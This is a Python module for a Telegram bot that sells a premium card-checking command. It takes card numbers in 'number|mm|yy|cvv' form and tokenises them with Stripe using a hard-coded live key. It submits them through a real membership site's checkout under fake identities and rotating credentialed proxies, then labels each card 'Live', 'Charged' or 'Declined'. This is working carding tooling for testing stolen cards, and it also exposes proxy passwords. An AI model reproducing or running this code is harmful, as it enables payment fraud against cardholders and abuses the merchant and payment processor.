import time
import re
import aiohttp
import requests
import random
import string
import traceback
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access 
from config import OWNER_ID
from pyrogram import filters
from fake_useragent import UserAgent
from requests.exceptions import RequestException, Timeout
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

proxy_list = [
    "http://nzvuwsmz:yS6ks569Hy@65.181.174.194:63829",
    "http://nzvuwsmz:yS6ks569Hy@65.181.171.160:62110",
    "http://nzvuwsmz:yS6ks569Hy@65.181.167.98:63631",
    "http://nzvuwsmz:yS6ks569Hy@65.181.170.115:60681",
    "http://nzvuwsmz:yS6ks569Hy@65.181.172.225:59225"
]

names = ['Jarvis', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William']
last_names = ['Sir', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez']
streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln']
cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix']
phones = ['682', '346', '246']
state_data = {'NY': 'New York', 'CA': 'California', 'TX': 'Texas', 'FL': 'Florida'}
zips = {'NY': '10001', 'CA': '90001', 'TX': '75001', 'FL': '33101'}

def generate_complex_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(24)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}"

def generate_custom_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(7)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"

def generate_random_profile():
    name = random.choice(names).capitalize()
    last = random.choice(last_names).capitalize()
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city = random.choice(cities)
    state_code = random.choice(list(state_data.keys()))
    state = state_data[state_code]
    zip_code = zips[state_code]
    phone = f"{random.choice(phones)}{random.randint(1000000, 9999999)}"
    email = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}@gmail.com"
    username = f"{name.lower()}.{last.lower()}{random.randint(0, 9999)}"
    return {
        'name': name,
        'last': last,
        'street': street,
        'city': city,
        'state_code': state_code,
        'state': state,
        'zip_code': zip_code,
        'phone': phone,
        'email': email,
        'username': username
    }

def new_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504], allowed_methods=["GET", "POST"])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    return session

def GetStr(string, start, end):
    if start in string and end in string:
        str_list = string.split(start)
        if len(str_list) > 1:
            try:
                return str_list[1].split(end)[0]
            except IndexError:
                return ""
    return ""

async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()
    session = new_session()

    profile = generate_random_profile()
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": UserAgent().random,
    }

    stripe_data = {
        'type': 'card',
        'billing_details[address][line1]': profile['street'],
        'billing_details[address][city]': profile['city'],
        'billing_details[address][state]': profile['state_code'],
        'billing_details[address][postal_code]': profile['zip_code'],
        'billing_details[address][country]': 'US',
        'billing_details[name]': f"{profile['name']} {profile['last']}",
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': generate_complex_id(),
        'muid': generate_complex_id(),
        'sid': generate_custom_id(),
        'key': 'pk_live_WafveUvMcUoY2W8xx3mYSBxR',
    }

    try:
        response = session.post(stripe_url, headers=stripe_headers, data=stripe_data)
        response.raise_for_status()

        if response.status_code == 200:
            token = response.json().get("id")
            l4 = response.json().get("card", {}).get("last4", "Unknown")
        else:
            return f"Failed to get token. Status code: {response.status_code}, Response: {response.text}"

        secondurl = 'https://amralive.com/membership-account/membership-checkout/'
        headers2 = {
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': UserAgent().random,
        }

        data2 = {
            'level': '1',
            'checkjavascript': '1',
            'username': profile['username'],
            'password': f"{profile['name']}12345",
            'password2': f"{profile['name']}12345",
            'bemail': profile['email'],
            'bconfirmemail': profile['email'],
            'bfirstname': profile['name'],
            'blastname': profile['last'],
            'baddress1': profile['street'],
            'bcity': profile['city'],
            'bstate': profile['state_code'],
            'bzipcode': profile['zip_code'],
            'bcountry': 'US',
            'bphone': profile['phone'],
            'CardType': 'visa',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': token,
            'AccountNumber': f"XXXXXXXXXXXX{l4}",
            'ExpirationMonth': mm,
            'ExpirationYear': yy,
        }

        second_response = session.post(secondurl, headers=headers2, data=data2)
        second_response.raise_for_status()
        result = second_response.text

        Respo = GetStr(result, '<div id="pmpro_message" class="pmpro_message pmpro_error">', '</div>')

        if 'Your card does not support this type of purchase.' in result or 'not support' in result or 'card does not support' in result or '"type":"one-time"' in result:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            resp = "Approved CVV"

        elif '"result":"success"' in result or '"Thank you. Your order has been received."' in result or 'SUCCEEDED' in result or 'APPROVED' in result or '"success"' in result:
            status = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 🔥"
            resp = "Payment Successful ✅"

        elif 'Invalid account' in result or 'account_Invalid' in result or '"Invalid account": "fail"' in result:
            status = "𝗖𝗖𝗡 🌿"
            resp = "Invalid Account"

        elif '"code":"incorrect_cvc"' in result or 'security code is incorrect.' in result or 'Your card&#039;s security code is incorrect.' in result or 'incorrect_cvc' in result or '"cvc_check": "fail"' in result or 'security code is invalid.' in result:
            status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲 ✅"
            resp = "Invalid security code"

        elif '"cvc_check":"pass"' in result or 'Your card zip code is incorrect.' in result or '"type":"one-time"' in result or 'incorrect_zip' in result:
            status = "𝗟𝗶𝘃𝗲 ✅"
            resp = "CVV Live"

        elif "requires_action" in result:
            status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲 ✅"
            resp = "Card Requires Customer Verificationn" 

        elif 'Insufficient funds' in result or 'Your card has insufficient funds.' in result or 'insufficient_funds' in result:
            status = "𝗖𝗮𝗿𝗱 𝗟𝗶𝘃𝗲 ✅"
            resp = "Insufficient Funds 💰"

        elif Respo:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            resp = f"{Respo}"

        else:
            status = "Error ⚠️"
            resp = "Unknown error"

        resp = resp.replace('Error updating default payment method.', '').strip()
        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        execution_time = time.time() - start_time
        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Sitebased\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id}) ⤿ {user_level} ⤾"
        )
        return final_response

    except (RequestException, Timeout):
        traceback.print_exc()
        return "Error processing the request."
    finally:
        session.close()


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

@app.on_message(filters.command("svv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id

    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    card_info = None
    if message.reply_to_message:
        card_info = re.search(card_pattern, message.reply_to_message.text)
        card_info = card_info.group() if card_info else None
    else:
        try:
            card_info = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            pass

    if not card_info or not card_pattern.match(card_info):
        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
